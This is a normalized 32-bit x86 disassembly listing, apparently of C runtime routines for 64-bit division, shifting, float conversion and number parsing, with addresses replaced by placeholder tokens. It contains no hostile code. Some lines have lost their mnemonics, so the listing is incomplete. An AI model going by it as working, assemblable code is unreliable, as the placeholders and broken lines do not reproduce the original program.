xor edx edx
cmp eax edx
jne r-xdata
cmp edi edx
je r-xdata
add ebx 0x3c01
mov [ ebp - 0x4 ] edx
cmp ecx edx
jne r-xdata
mov edi 0x7fff
jmp r-xdata
add ebx 0x3c00
jmp r-xdata
mov [ eax ] ecx
mov [ eax + 0x4 ] edx
test esi edx
je r-xdata
mov eax [ ebp + 0x8 ]
mov cx [ ebp + 0xc ]
mov [ eax + 0x4 ] edx
mov [ eax ] edx
jmp r-xdata
mov edx ecx
shr edx 0x15
shl eax 0xb
or edx eax
or edx [ ebp - 0x4 ]
mov eax [ ebp + 0x8 ]
shl ecx 0xb
jmp r-xdata
movzx edi bx
mov ecx [ eax ]
mov ebx ecx
shr ebx 0x1f
add edx edx
or edx ebx
add ecx ecx
add edi 0xffff
mov ecx [ ebp + 0xc ]
or ecx edi
pop edi
pop esi
mov [ eax + 0x8 ] cx
pop ebx
leave
retn
sub_10010aa3
mov edi edi
push ebp
mov ebp esp
sub esp 0x30
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x14 ]
push ebx
mov ebx [ ebp + 0x10 ]
push esi
mov [ ebp - 0x24 ] eax
push edi
lea eax [ ebp + 0x8 ]
push eax
lea eax [ ebp - 0x30 ]
push eax
call sub_100109f0
pop ecx
pop ecx
lea eax [ ebp - 0x20 ]
push eax
push 0x0
push 0x11
sub esp 0xc
lea esi [ ebp - 0x30 ]
mov edi esp
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsw [ edi ] [ esi ]
call sub_10011e1c
mov esi [ ebp - 0x24 ]
mov [ ebx + 0x8 ] eax
movsx eax [ ebp - 0x1e ]
mov [ ebx ] eax
movsx eax [ ebp - 0x20 ]
mov [ ebx + 0x4 ] eax
lea eax [ ebp - 0x1c ]
push eax
push [ ebp + 0x18 ]
push esi
call sub_10007d33
add esp 0x24
test eax eax
jne r-xdata
xor eax eax
push eax
push eax
push eax
push eax
push eax
call sub_100077ee
int3
mov ecx [ ebp - 0x4 ]
pop edi
mov [ ebx + 0xc ] esi
pop esi
mov eax ebx
xor ecx ebp
pop ebx
call sub_10008edb
leave
retn
sub_10010b40
push edi
push esi
push ebp
xor edi edi
xor ebp ebp
mov eax [ esp + 0x14 ]
or eax eax
jge r-xdata
mov eax [ esp + 0x1c ]
or eax eax
jge r-xdata
inc edi
inc ebp
mov edx [ esp + 0x10 ]
neg eax
neg edx
sbb eax 0x0
mov [ esp + 0x14 ] eax
mov [ esp + 0x10 ] edx
or eax eax
jne r-xdata
inc edi
mov edx [ esp + 0x18 ]
neg eax
neg edx
sbb eax 0x0
mov [ esp + 0x1c ] eax
mov [ esp + 0x18 ] edx
mov ebx eax
mov ecx [ esp + 0x18 ]
mov edx [ esp + 0x14 ]
mov eax [ esp + 0x10 ]
mov ecx [ esp + 0x18 ]
mov eax [ esp + 0x14 ]
xor edx edx
div ecx
mov ebx eax
mov eax [ esp + 0x10 ]
div ecx
mov esi eax
mov eax ebx
mul [ esp + 0x18 ]
mov ecx eax
mov eax esi
mul [ esp + 0x18 ]
add edx ecx
jmp r-xdata
shr ebx 0x1
rcr ecx 0x1
shr edx 0x1
rcr eax 0x1
or ebx ebx
jne r-xdata
div ecx
mov esi eax
mul [ esp + 0x1c ]
mov ecx eax
mov eax [ esp + 0x18 ]
mul esi
add edx ecx
jb r-xdata
sub eax [ esp + 0x10 ]
sbb edx [ esp + 0x14 ]
dec ebp
jns r-xdata
dec esi
sub eax [ esp + 0x18 ]
sbb edx [ esp + 0x1c ]
cmp edx [ esp + 0x14 ]
ja r-xdata
mov ecx edx
mov edx ebx
mov ebx ecx
mov ecx eax
mov eax esi
dec edi
jne r-xdata
neg edx
neg eax
sbb edx 0x0
jb r-xdata
pop ebp
pop esi
pop edi
retn 0x10
neg edx
neg eax
sbb edx 0x0
xor ebx ebx
cmp eax [ esp + 0x10 ]
jbe r-xdata
sub_10010c20
cmp cl 0x40
jae r-xdata
xor eax eax
xor edx edx
retn
cmp cl 0x20
jae r-xdata
mov eax edx
xor edx edx
and cl 0x1f
shr eax cl
retn
shrd eax edx cl
shr edx cl
retn
sub_10010c3f
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x10 ]
mov ecx [ ebp + 0xc ]
and eax 0xfff7ffff
and ecx eax
push esi
mov esi [ ebp + 0x8 ]
test ecx 0xfcf0fce0
je r-xdata
push eax
push [ ebp + 0xc ]
test esi esi
je r-xdata
test esi esi
je r-xdata
call sub_10012842
call sub_10012842
mov [ esi ] eax
jmp r-xdata
call sub_10007892
push 0x16
pop esi
mov [ eax ] esi
call sub_10007840
mov eax esi
jmp r-xdata
push 0x0
push 0x0
call sub_10012842
pop ecx
pop ecx
mov [ esi ] eax
pop ecx
pop ecx
xor eax eax
pop esi
pop ebp
retn
sub_10010c9e
mov edi edi
push ebp
mov ebp esp
sub esp 0x38
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
mov ecx [ ebp + 0xc ]
mov [ ebp - 0x34 ] ecx
movzx ecx [ eax + 0xa ]
push ebx
mov ebx ecx
and ecx 0x8000
mov [ ebp - 0x38 ] ecx
mov ecx [ eax + 0x6 ]
mov [ ebp - 0x10 ] ecx
mov ecx [ eax + 0x2 ]
movzx eax [ eax ]
and ebx 0x7fff
sub ebx 0x3fff
shl eax 0x10
push edi
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] eax
cmp ebx 0xffffc001
jne r-xdata
and [ ebp - 0x24 ] 0x0
push esi
lea esi [ ebp - 0x10 ]
lea edi [ ebp - 0x1c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov edi [ rw-data ]
dec edi
lea eax [ edi + 0x1 ]
cdq
and edx 0x1f
add eax edx
sar eax 0x5
lea edx [ edi + 0x1 ]
and edx 0x8000001f
mov [ ebp - 0x2c ] ebx
mov [ ebp - 0x28 ] eax
jns r-xdata
xor ebx ebx
xor eax eax
lea esi [ ebp + eax * 4 - 0x10 ]
push 0x1f
xor eax eax
pop ecx
sub ecx edx
inc eax
shl eax cl
mov [ ebp - 0x30 ] ecx
test [ esi ] eax
je r-xdata
dec edx
or edx 0xffffffe0
inc edx
xor eax eax
lea edi [ ebp - 0x10 ]
stosd [ edi ]
stosd [ edi ]
push 0x2
stosd [ edi ]
pop eax
jmp r-xdata
inc eax
cmp eax 0x3
jl r-xdata
mov ecx [ ebp - 0x30 ]
or eax 0xffffffff
shl eax cl
push 0x3
pop ecx
and [ esi ] eax
mov eax [ ebp - 0x28 ]
inc eax
cmp eax ecx
jge r-xdata
mov eax [ ebp - 0x28 ]
or edx 0xffffffff
shl edx cl
not edx
test [ ebp + eax * 4 - 0x10 ] edx
jmp r-xdata
push 0x1f
pop ecx
sub ecx [ rw-data ]
shl ebx cl
mov ecx [ ebp - 0x38 ]
neg ecx
sbb ecx ecx
and ecx 0x80000000
or ebx ecx
mov ecx [ rw-data ]
or ebx [ ebp - 0x10 ]
cmp ecx 0x40
jne r-xdata
cmp [ ebp + eax * 4 - 0x10 ] ebx
jne r-xdata
xor eax eax
jmp r-xdata
cmp [ ebp - 0x24 ] 0x0
je r-xdata
lea edi [ ebp + eax * 4 - 0x10 ]
sub ecx eax
xor eax eax
[ edi ]
jne r-xdata
cmp ecx 0x20
jne r-xdata
mov ecx [ ebp - 0x34 ]
mov edx [ ebp - 0xc ]
mov [ ecx + 0x4 ] ebx
mov [ ecx ] edx
jmp r-xdata
mov eax [ rw-data ]
mov ecx eax
sub ecx [ rw-data ]
cmp ebx ecx
jge r-xdata
inc ebx
mov eax edi
cdq
push 0x1f
pop ecx
and edx ecx
add eax edx
sar eax 0x5
and edi 0x8000001f
jns r-xdata
inc eax
cmp eax 0x3
jl r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
xor ecx ebp
pop ebx
call sub_10008edb
leave
retn
mov ecx [ ebp - 0x34 ]
mov [ ecx ] ebx
cmp ebx eax
jg r-xdata
xor eax eax
lea edi [ ebp - 0x10 ]
stosd [ edi ]
stosd [ edi ]
stosd [ edi ]
jmp r-xdata
and [ ebp - 0x24 ] 0x0
sub ecx edi
xor edx edx
inc edx
shl edx cl
lea ecx [ ebp + eax * 4 - 0x10 ]
mov edi [ ecx ]
add edi edx
mov [ ebp - 0x20 ] edi
mov edi [ ecx ]
cmp [ ebp - 0x20 ] edi
jb r-xdata
dec edi
or edi 0xffffffe0
inc edi
cmp [ ebp + eax * 4 - 0x10 ] 0x0
jmp r-xdata
mov ecx [ rw-data ]
cmp ebx [ rw-data ]
jl r-xdata
sub eax [ ebp - 0x2c ]
lea esi [ ebp - 0x1c ]
mov ecx eax
lea edi [ ebp - 0x10 ]
movsd [ edi ] [ esi ]
cdq
and edx 0x1f
add eax edx
movsd [ edi ] [ esi ]
mov edx ecx
sar eax 0x5
and edx 0x8000001f
movsd [ edi ] [ esi ]
jns r-xdata
push 0x2
xor ebx ebx
pop eax
jmp r-xdata
mov [ ebp - 0x24 ] 0x1
cmp [ ebp - 0x20 ] edx
jmp r-xdata
add ebx [ rw-data ]
and [ ebp - 0x10 ] 0x7fffffff
mov eax ecx
cdq
and edx 0x1f
add eax edx
mov edx ecx
sar eax 0x5
and edx 0x8000001f
jns r-xdata
xor eax eax
lea edi [ ebp - 0x10 ]
stosd [ edi ]
stosd [ edi ]
stosd [ edi ]
or [ ebp - 0x10 ] 0x80000000
mov eax ecx
cdq
and edx 0x1f
add eax edx
mov edx ecx
sar eax 0x5
and edx 0x8000001f
jns r-xdata
and [ ebp - 0x28 ] 0x0
and [ ebp - 0x20 ] 0x0
or edi 0xffffffff
mov ecx edx
shl edi cl
mov [ ebp - 0x24 ] 0x20
sub [ ebp - 0x24 ] edx
not edi
dec edx
or edx 0xffffffe0
inc edx
pop esi
test ecx ecx
je r-xdata
mov [ ebp - 0x24 ] ecx
jae r-xdata
and [ ebp - 0x28 ] 0x0
and [ ebp - 0x20 ] 0x0
or esi 0xffffffff
mov ecx edx
shl esi cl
mov [ ebp - 0x24 ] 0x20
sub [ ebp - 0x24 ] edx
not esi
dec edx
or edx 0xffffffe0
inc edx
and [ ebp - 0x28 ] 0x0
and [ ebp - 0x20 ] 0x0
or edi 0xffffffff
mov ecx edx
shl edi cl
mov [ ebp - 0x24 ] 0x20
sub [ ebp - 0x24 ] edx
not edi
dec edx
or edx 0xffffffe0
inc edx
mov ebx [ ebp - 0x20 ]
lea ebx [ ebp + ebx * 4 - 0x10 ]
mov esi [ ebx ]
mov ecx esi
and ecx edi
mov [ ebp - 0x2c ] ecx
mov ecx edx
shr esi cl
mov ecx [ ebp - 0x24 ]
or esi [ ebp - 0x28 ]
mov [ ebx ] esi
mov esi [ ebp - 0x2c ]
shl esi cl
inc [ ebp - 0x20 ]
cmp [ ebp - 0x20 ] 0x3
mov [ ebp - 0x28 ] esi
jl r-xdata
mov esi eax
push 0x2
shl esi 0x2
lea ecx [ ebp - 0x8 ]
pop edx
sub ecx esi
and [ ebp - 0x24 ] 0x0
lea ecx [ ebp + eax * 4 - 0x10 ]
mov edx [ ecx ]
lea edi [ edx + 0x1 ]
mov [ ebp - 0x20 ] edi
cmp edi edx
jb r-xdata
dec eax
mov edx [ ebp - 0x20 ]
mov [ ecx ] edx
mov ecx [ ebp - 0x24 ]
jns r-xdata
mov ecx [ ebp - 0x20 ]
mov edi [ ebp + ecx * 4 - 0x10 ]
mov ecx edi
and ecx esi
mov [ ebp - 0x2c ] ecx
mov ecx edx
shr edi cl
mov ecx [ ebp - 0x20 ]
or edi [ ebp - 0x28 ]
mov [ ebp + ecx * 4 - 0x10 ] edi
mov edi [ ebp - 0x2c ]
mov ecx [ ebp - 0x24 ]
shl edi cl
inc [ ebp - 0x20 ]
cmp [ ebp - 0x20 ] 0x3
mov [ ebp - 0x28 ] edi
jl r-xdata
mov esi eax
push 0x2
shl esi 0x2
lea ecx [ ebp - 0x8 ]
pop edx
sub ecx esi
mov ebx [ ebp - 0x20 ]
lea ebx [ ebp + ebx * 4 - 0x10 ]
mov esi [ ebx ]
mov ecx esi
and ecx edi
mov [ ebp - 0x2c ] ecx
mov ecx edx
shr esi cl
mov ecx [ ebp - 0x24 ]
or esi [ ebp - 0x28 ]
mov [ ebx ] esi
mov esi [ ebp - 0x2c ]
shl esi cl
inc [ ebp - 0x20 ]
cmp [ ebp - 0x20 ] 0x3
mov [ ebp - 0x28 ] esi
jl r-xdata
mov esi eax
push 0x2
shl esi 0x2
lea ecx [ ebp - 0x8 ]
pop edx
sub ecx esi
and [ ebp + edx * 4 - 0x10 ] 0x0
mov esi [ ecx ]
mov [ ebp + edx * 4 - 0x10 ] esi
jmp r-xdata
cmp edi 0x1
and [ ebp + edx * 4 - 0x10 ] 0x0
mov esi [ ecx ]
mov [ ebp + edx * 4 - 0x10 ] esi
jmp r-xdata
and [ ebp + edx * 4 - 0x10 ] 0x0
mov esi [ ecx ]
mov [ ebp + edx * 4 - 0x10 ] esi
jmp r-xdata
cmp edx eax
jl r-xdata
mov esi [ rw-data ]
dec esi
lea eax [ esi + 0x1 ]
cdq
and edx 0x1f
add eax edx
sar eax 0x5
lea edx [ esi + 0x1 ]
and edx 0x8000001f
mov [ ebp - 0x30 ] eax
jns r-xdata
sub ecx 0x4
dec edx
jns r-xdata
cmp edx eax
jl r-xdata
xor eax eax
sub ecx 0x4
dec edx
jns r-xdata
cmp edx eax
jl r-xdata
mov ebx [ rw-data ]
add ebx [ rw-data ]
xor eax eax
inc eax
jmp r-xdata
sub ecx 0x4
dec edx
jns r-xdata
push 0x1f
pop ecx
sub ecx edx
xor edx edx
inc edx
shl edx cl
lea ebx [ ebp + eax * 4 - 0x10 ]
mov [ ebp - 0x2c ] ecx
test [ ebx ] edx
je r-xdata
dec edx
or edx 0xffffffe0
inc edx
mov ecx [ ebp - 0x2c ]
or eax 0xffffffff
shl eax cl
and [ ebx ] eax
mov eax [ ebp - 0x30 ]
inc eax
cmp eax 0x3
jge r-xdata
or edx 0xffffffff
shl edx cl
not edx
test [ ebp + eax * 4 - 0x10 ] edx
jmp r-xdata
mov ecx [ rw-data ]
lea eax [ ecx + 0x1 ]
cdq
and edx 0x1f
add eax edx
lea edx [ ecx + 0x1 ]
sar eax 0x5
and edx 0x8000001f
jns r-xdata
push 0x3
pop ecx
lea edi [ ebp + eax * 4 - 0x10 ]
sub ecx eax
xor eax eax
[ edi ]
jne r-xdata
and [ ebp - 0x28 ] 0x0
and [ ebp - 0x20 ] 0x0
or edi 0xffffffff
mov ecx edx
shl edi cl
mov [ ebp - 0x24 ] 0x20
sub [ ebp - 0x24 ] edx
not edi
dec edx
or edx 0xffffffe0
inc edx
mov eax esi
cdq
push 0x1f
pop ecx
and edx ecx
add eax edx
sar eax 0x5
and esi 0x8000001f
jns r-xdata
inc eax
cmp eax 0x3
jl r-xdata
mov ebx [ ebp - 0x20 ]
lea ebx [ ebp + ebx * 4 - 0x10 ]
mov esi [ ebx ]
mov ecx esi
and ecx edi
mov [ ebp - 0x2c ] ecx
mov ecx edx
shr esi cl
mov ecx [ ebp - 0x24 ]
or esi [ ebp - 0x28 ]
mov [ ebx ] esi
mov esi [ ebp - 0x2c ]
shl esi cl
inc [ ebp - 0x20 ]
cmp [ ebp - 0x20 ] 0x3
mov [ ebp - 0x28 ] esi
jl r-xdata
mov esi eax
push 0x2
shl esi 0x2
lea ecx [ ebp - 0x8 ]
pop edx
sub ecx esi
and [ ebp - 0x28 ] 0x0
xor edx edx
sub ecx esi
inc edx
shl edx cl
lea ecx [ ebp + eax * 4 - 0x10 ]
mov esi [ ecx ]
lea edi [ esi + edx ]
cmp edi esi
jb r-xdata
dec esi
or esi 0xffffffe0
inc esi
cmp [ ebp + eax * 4 - 0x10 ] 0x0
jmp r-xdata
and [ ebp + edx * 4 - 0x10 ] 0x0
mov esi [ ecx ]
mov [ ebp + edx * 4 - 0x10 ] esi
jmp r-xdata
mov [ ebp - 0x28 ] 0x1
cmp edi edx
jae r-xdata
cmp edx eax
jl r-xdata
sub ecx 0x4
dec edx
jns r-xdata
dec eax
jns r-xdata
mov [ ecx ] edi
mov ecx [ ebp - 0x28 ]
jmp r-xdata
test ecx ecx
je r-xdata
lea ecx [ ebp + eax * 4 - 0x10 ]
mov edx [ ecx ]
lea esi [ edx + 0x1 ]
xor edi edi
cmp esi edx
jb r-xdata
xor edi edi
inc edi
cmp esi 0x1
jae r-xdata
mov [ ecx ] esi
mov ecx edi
sub_100111ef
mov edi edi
push ebp
mov ebp esp
sub esp 0x38
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
mov ecx [ ebp + 0xc ]
mov [ ebp - 0x34 ] ecx
movzx ecx [ eax + 0xa ]
push ebx
mov ebx ecx
and ecx 0x8000
mov [ ebp - 0x38 ] ecx
mov ecx [ eax + 0x6 ]
mov [ ebp - 0x10 ] ecx
mov ecx [ eax + 0x2 ]
movzx eax [ eax ]
and ebx 0x7fff
sub ebx 0x3fff
shl eax 0x10
push edi
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] eax
cmp ebx 0xffffc001
jne r-xdata
and [ ebp - 0x24 ] 0x0
push esi
lea esi [ ebp - 0x10 ]
lea edi [ ebp - 0x1c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov edi [ rw-data ]
dec edi
lea eax [ edi + 0x1 ]
cdq
and edx 0x1f
add eax edx
sar eax 0x5
lea edx [ edi + 0x1 ]
and edx 0x8000001f
mov [ ebp - 0x2c ] ebx
mov [ ebp - 0x28 ] eax
jns r-xdata
xor ebx ebx
xor eax eax
lea esi [ ebp + eax * 4 - 0x10 ]
push 0x1f
xor eax eax
pop ecx
sub ecx edx
inc eax
shl eax cl
mov [ ebp - 0x30 ] ecx
test [ esi ] eax
je r-xdata
dec edx
or edx 0xffffffe0
inc edx
xor eax eax
lea edi [ ebp - 0x10 ]
stosd [ edi ]
stosd [ edi ]
push 0x2
stosd [ edi ]
pop eax
jmp r-xdata
inc eax
cmp eax 0x3
jl r-xdata
mov ecx [ ebp - 0x30 ]
or eax 0xffffffff
shl eax cl
push 0x3
pop ecx
and [ esi ] eax
mov eax [ ebp - 0x28 ]
inc eax
cmp eax ecx
jge r-xdata
mov eax [ ebp - 0x28 ]
or edx 0xffffffff
shl edx cl
not edx
test [ ebp + eax * 4 - 0x10 ] edx
jmp r-xdata
push 0x1f
pop ecx
sub ecx [ rw-data ]
shl ebx cl
mov ecx [ ebp - 0x38 ]
neg ecx
sbb ecx ecx
and ecx 0x80000000
or ebx ecx
mov ecx [ rw-data ]
or ebx [ ebp - 0x10 ]
cmp ecx 0x40
jne r-xdata
cmp [ ebp + eax * 4 - 0x10 ] ebx
jne r-xdata
xor eax eax
jmp r-xdata
cmp [ ebp - 0x24 ] 0x0
je r-xdata
lea edi [ ebp + eax * 4 - 0x10 ]
sub ecx eax
xor eax eax
[ edi ]
jne r-xdata
cmp ecx 0x20
jne r-xdata
mov ecx [ ebp - 0x34 ]
mov edx [ ebp - 0xc ]
mov [ ecx + 0x4 ] ebx
mov [ ecx ] edx
jmp r-xdata
mov eax [ rw-data ]
mov ecx eax
sub ecx [ rw-data ]
cmp ebx ecx
jge r-xdata
inc ebx
mov eax edi
cdq
push 0x1f
pop ecx
and edx ecx
add eax edx
sar eax 0x5
and edi 0x8000001f
jns r-xdata
inc eax
cmp eax 0x3
jl r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
xor ecx ebp
pop ebx
call sub_10008edb
leave
retn
mov ecx [ ebp - 0x34 ]
mov [ ecx ] ebx
cmp ebx eax
jg r-xdata
xor eax eax
lea edi [ ebp - 0x10 ]
stosd [ edi ]
stosd [ edi ]
stosd [ edi ]
jmp r-xdata
and [ ebp - 0x24 ] 0x0
sub ecx edi
xor edx edx
inc edx
shl edx cl
lea ecx [ ebp + eax * 4 - 0x10 ]
mov edi [ ecx ]
add edi edx
mov [ ebp - 0x20 ] edi
mov edi [ ecx ]
cmp [ ebp - 0x20 ] edi
jb r-xdata
dec edi
or edi 0xffffffe0
inc edi
cmp [ ebp + eax * 4 - 0x10 ] 0x0
jmp r-xdata
mov ecx [ rw-data ]
cmp ebx [ rw-data ]
jl r-xdata
sub eax [ ebp - 0x2c ]
lea esi [ ebp - 0x1c ]
mov ecx eax
lea edi [ ebp - 0x10 ]
movsd [ edi ] [ esi ]
cdq
and edx 0x1f
add eax edx
movsd [ edi ] [ esi ]
mov edx ecx
sar eax 0x5
and edx 0x8000001f
movsd [ edi ] [ esi ]
jns r-xdata
push 0x2
xor ebx ebx
pop eax
jmp r-xdata
mov [ ebp - 0x24 ] 0x1
cmp [ ebp - 0x20 ] edx
jmp r-xdata
add ebx [ rw-data ]
and [ ebp - 0x10 ] 0x7fffffff
mov eax ecx
cdq
and edx 0x1f
add eax edx
mov edx ecx
sar eax 0x5
and edx 0x8000001f
jns r-xdata
xor eax eax
lea edi [ ebp - 0x10 ]
stosd [ edi ]
stosd [ edi ]
stosd [ edi ]
or [ ebp - 0x10 ] 0x80000000
mov eax ecx
cdq
and edx 0x1f
add eax edx
mov edx ecx
sar eax 0x5
and edx 0x8000001f
jns r-xdata
and [ ebp - 0x28 ] 0x0
and [ ebp - 0x20 ] 0x0
or edi 0xffffffff
mov ecx edx
shl edi cl
mov [ ebp - 0x24 ] 0x20
sub [ ebp - 0x24 ] edx
not edi
dec edx
or edx 0xffffffe0
inc edx
pop esi
test ecx ecx
je r-xdata
mov [ ebp - 0x24 ] ecx
jae r-xdata
and [ ebp - 0x28 ] 0x0
and [ ebp - 0x20 ] 0x0
or esi 0xffffffff
mov ecx edx
shl esi cl
mov [ ebp - 0x24 ] 0x20
sub [ ebp - 0x24 ] edx
not esi
dec edx
or edx 0xffffffe0
inc edx
and [ ebp - 0x28 ] 0x0
and [ ebp - 0x20 ] 0x0
or edi 0xffffffff
mov ecx edx
shl edi cl
mov [ ebp - 0x24 ] 0x20
sub [ ebp - 0x24 ] edx
not edi
dec edx
or edx 0xffffffe0
inc edx
mov ebx [ ebp - 0x20 ]
lea ebx [ ebp + ebx * 4 - 0x10 ]
mov esi [ ebx ]
mov ecx esi
and ecx edi
mov [ ebp - 0x2c ] ecx
mov ecx edx
shr esi cl
mov ecx [ ebp - 0x24 ]
or esi [ ebp - 0x28 ]
mov [ ebx ] esi
mov esi [ ebp - 0x2c ]
shl esi cl
inc [ ebp - 0x20 ]
cmp [ ebp - 0x20 ] 0x3
mov [ ebp - 0x28 ] esi
jl r-xdata
mov esi eax
push 0x2
shl esi 0x2
lea ecx [ ebp - 0x8 ]
pop edx
sub ecx esi
and [ ebp - 0x24 ] 0x0
lea ecx [ ebp + eax * 4 - 0x10 ]
mov edx [ ecx ]
lea edi [ edx + 0x1 ]
mov [ ebp - 0x20 ] edi
cmp edi edx
jb r-xdata
dec eax
mov edx [ ebp - 0x20 ]
mov [ ecx ] edx
mov ecx [ ebp - 0x24 ]
jns r-xdata
mov ecx [ ebp - 0x20 ]
mov edi [ ebp + ecx * 4 - 0x10 ]
mov ecx edi
and ecx esi
mov [ ebp - 0x2c ] ecx
mov ecx edx
shr edi cl
mov ecx [ ebp - 0x20 ]
or edi [ ebp - 0x28 ]
mov [ ebp + ecx * 4 - 0x10 ] edi
mov edi [ ebp - 0x2c ]
mov ecx [ ebp - 0x24 ]
shl edi cl
inc [ ebp - 0x20 ]
cmp [ ebp - 0x20 ] 0x3
mov [ ebp - 0x28 ] edi
jl r-xdata
mov esi eax
push 0x2
shl esi 0x2
lea ecx [ ebp - 0x8 ]
pop edx
sub ecx esi
mov ebx [ ebp - 0x20 ]
lea ebx [ ebp + ebx * 4 - 0x10 ]
mov esi [ ebx ]
mov ecx esi
and ecx edi
mov [ ebp - 0x2c ] ecx
mov ecx edx
shr esi cl
mov ecx [ ebp - 0x24 ]
or esi [ ebp - 0x28 ]
mov [ ebx ] esi
mov esi [ ebp - 0x2c ]
shl esi cl
inc [ ebp - 0x20 ]
cmp [ ebp - 0x20 ] 0x3
mov [ ebp - 0x28 ] esi
jl r-xdata
mov esi eax
push 0x2
shl esi 0x2
lea ecx [ ebp - 0x8 ]
pop edx
sub ecx esi
and [ ebp + edx * 4 - 0x10 ] 0x0
mov esi [ ecx ]
mov [ ebp + edx * 4 - 0x10 ] esi
jmp r-xdata
cmp edi 0x1
and [ ebp + edx * 4 - 0x10 ] 0x0
mov esi [ ecx ]
mov [ ebp + edx * 4 - 0x10 ] esi
jmp r-xdata
and [ ebp + edx * 4 - 0x10 ] 0x0
mov esi [ ecx ]
mov [ ebp + edx * 4 - 0x10 ] esi
jmp r-xdata
cmp edx eax
jl r-xdata
mov esi [ rw-data ]
dec esi
lea eax [ esi + 0x1 ]
cdq
and edx 0x1f
add eax edx
sar eax 0x5
lea edx [ esi + 0x1 ]
and edx 0x8000001f
mov [ ebp - 0x30 ] eax
jns r-xdata
sub ecx 0x4
dec edx
jns r-xdata
cmp edx eax
jl r-xdata
xor eax eax
sub ecx 0x4
dec edx
jns r-xdata
cmp edx eax
jl r-xdata
mov ebx [ rw-data ]
add ebx [ rw-data ]
xor eax eax
inc eax
jmp r-xdata
sub ecx 0x4
dec edx
jns r-xdata
push 0x1f
pop ecx
sub ecx edx
xor edx edx
inc edx
shl edx cl
lea ebx [ ebp + eax * 4 - 0x10 ]
mov [ ebp - 0x2c ] ecx
test [ ebx ] edx
je r-xdata
dec edx
or edx 0xffffffe0
inc edx
mov ecx [ ebp - 0x2c ]
or eax 0xffffffff
shl eax cl
and [ ebx ] eax
mov eax [ ebp - 0x30 ]
inc eax
cmp eax 0x3
jge r-xdata
or edx 0xffffffff
shl edx cl
not edx
test [ ebp + eax * 4 - 0x10 ] edx
jmp r-xdata
mov ecx [ rw-data ]
lea eax [ ecx + 0x1 ]
cdq
and edx 0x1f
add eax edx
lea edx [ ecx + 0x1 ]
sar eax 0x5
and edx 0x8000001f
jns r-xdata
push 0x3
pop ecx
lea edi [ ebp + eax * 4 - 0x10 ]
sub ecx eax
xor eax eax
[ edi ]
jne r-xdata
and [ ebp - 0x28 ] 0x0
and [ ebp - 0x20 ] 0x0
or edi 0xffffffff
mov ecx edx
shl edi cl
mov [ ebp - 0x24 ] 0x20
sub [ ebp - 0x24 ] edx
not edi
dec edx
or edx 0xffffffe0
inc edx
mov eax esi
cdq
push 0x1f
pop ecx
and edx ecx
add eax edx
sar eax 0x5
and esi 0x8000001f
jns r-xdata
inc eax
cmp eax 0x3
jl r-xdata
mov ebx [ ebp - 0x20 ]
lea ebx [ ebp + ebx * 4 - 0x10 ]
mov esi [ ebx ]
mov ecx esi
and ecx edi
mov [ ebp - 0x2c ] ecx
mov ecx edx
shr esi cl
mov ecx [ ebp - 0x24 ]
or esi [ ebp - 0x28 ]
mov [ ebx ] esi
mov esi [ ebp - 0x2c ]
shl esi cl
inc [ ebp - 0x20 ]
cmp [ ebp - 0x20 ] 0x3
mov [ ebp - 0x28 ] esi
jl r-xdata
mov esi eax
push 0x2
shl esi 0x2
lea ecx [ ebp - 0x8 ]
pop edx
sub ecx esi
and [ ebp - 0x28 ] 0x0
xor edx edx
sub ecx esi
inc edx
shl edx cl
lea ecx [ ebp + eax * 4 - 0x10 ]
mov esi [ ecx ]
lea edi [ esi + edx ]
cmp edi esi
jb r-xdata
dec esi
or esi 0xffffffe0
inc esi
cmp [ ebp + eax * 4 - 0x10 ] 0x0
jmp r-xdata
and [ ebp + edx * 4 - 0x10 ] 0x0
mov esi [ ecx ]
mov [ ebp + edx * 4 - 0x10 ] esi
jmp r-xdata
mov [ ebp - 0x28 ] 0x1
cmp edi edx
jae r-xdata
cmp edx eax
jl r-xdata
sub ecx 0x4
dec edx
jns r-xdata
dec eax
jns r-xdata
mov [ ecx ] edi
mov ecx [ ebp - 0x28 ]
jmp r-xdata
test ecx ecx
je r-xdata
lea ecx [ ebp + eax * 4 - 0x10 ]
mov edx [ ecx ]
lea esi [ edx + 0x1 ]
xor edi edi
cmp esi edx
jb r-xdata
xor edi edi
inc edi
cmp esi 0x1
jae r-xdata
mov [ ecx ] esi
mov ecx edi
sub_10011740
mov edi edi
push ebp
mov ebp esp
sub esp 0x7c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
xor ecx ecx
push esi
xor esi esi
mov [ ebp - 0x78 ] eax
mov eax [ ebp + 0xc ]
inc esi
push edi
mov [ ebp - 0x70 ] eax
lea edi [ ebp - 0x20 ]
mov [ ebp - 0x74 ] ecx
mov [ ebp - 0x68 ] esi
mov [ ebp - 0x4c ] ecx
mov [ ebp - 0x58 ] ecx
mov [ ebp - 0x5c ] ecx
mov [ ebp - 0x60 ] ecx
mov [ ebp - 0x64 ] ecx
mov [ ebp - 0x50 ] ecx
mov [ ebp - 0x6c ] ecx
cmp [ ebp + 0x24 ] ecx
jne r-xdata
mov edx [ ebp + 0x10 ]
mov [ ebp - 0x54 ] edx
call sub_10007892
mov [ eax ] 0x16
call sub_10007840
xor eax eax
jmp r-xdata
inc edx
jmp r-xdata
cmp al 0x9
je r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
xor ecx ebp
pop esi
call sub_10008edb
leave
retn
mov al [ edx ]
cmp al 0x20
je r-xdata
cmp al 0xa
je r-xdata
cmp al 0xd
jne r-xdata
push ebx
mov bl 0x30
cmp ecx 0xa
jne r-xdata
jmp [ ecx * 4 + jump_table_10011dec ]
mov al [ edx ]
inc edx
cmp ecx 0xb
ja r-xdata
jmp r-xdata
lea ecx [ eax - 0x31 ]
cmp cl 0x8
ja r-xdata
